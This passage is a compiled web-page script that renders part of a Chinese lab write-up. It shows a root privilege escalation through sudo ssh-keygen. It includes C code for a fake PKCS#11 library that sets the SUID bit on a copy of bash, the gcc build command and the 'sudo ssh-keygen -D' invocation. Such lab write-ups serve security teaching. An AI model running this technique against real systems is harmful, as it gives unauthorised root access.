punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n        "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("system")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"chmod u+s /tmp/bash"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n    "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("}")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("}")]),s._v("\n\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("// 伪装的PKCS#11函数 - 必须存在但可以返回错误")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("void")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("C_GetFunctionList")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("CK_FUNCTION_LIST"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("*")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("*")]),s._v(" ppFunctionList"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("{")]),s._v("\n    "),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("// 什么都不做或返回错误，但函数必须存在")]),s._v("\n    "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("*")]),s._v("ppFunctionList "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token constant"}},[s._v("NULL")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("}")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br"),a("span",{staticClass:"line-number"},[s._v("9")]),a("br"),a("span",{staticClass:"line-number"},[s._v("10")]),a("br"),a("span",{staticClass:"line-number"},[s._v("11")]),a("br"),a("span",{staticClass:"line-number"},[s._v("12")]),a("br"),a("span",{staticClass:"line-number"},[s._v("13")]),a("br"),a("span",{staticClass:"line-number"},[s._v("14")]),a("br"),a("span",{staticClass:"line-number"},[s._v("15")]),a("br"),a("span",{staticClass:"line-number"},[s._v("16")]),a("br"),a("span",{staticClass:"line-number"},[s._v("17")]),a("br"),a("span",{staticClass:"line-number"},[s._v("18")]),a("br"),a("span",{staticClass:"line-number"},[s._v("19")]),a("br"),a("span",{staticClass:"line-number"},[s._v("20")]),a("br"),a("span",{staticClass:"line-number"},[s._v("21")]),a("br")])]),a("p",[s._v("编译生成动态库 lib.so")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("gcc "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-shared")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-fPIC")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-o")]),s._v(" /tmp/lib.so /tmp/exp.c\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[a("img",{attrs:{src:"/medias/maze-secure/15.png",alt:""}})]),s._v(" "),a("p",[s._v("运行时，动态库会被 ssh-keygen 加载，执行 pwn 函数，复制 SUID bash 到 /tmp 目录下。")]),s._v(" "),a("h2",{attrs:{id:"ssh-keygen-提权到-root"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#ssh-keygen-提权到-root"}},[s._v("#")]),s._v(" ssh-keygen 提权到 root")]),s._v(" "),a("p",[s._v("sudo 执行 ssh-keygen，指定编译好的恶意库")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[a("span",{pre:!0,attrs:{class:"token function"}},[s._v("sudo")]),s._v(" ssh-keygen "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-D")]),s._v(" /tmp/lib.so\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[a("img",{attrs:{src:"/medias/maze-secure/16.png",alt:""}})])])}),[],!1,null,null,null);a.default=n.exports}}]);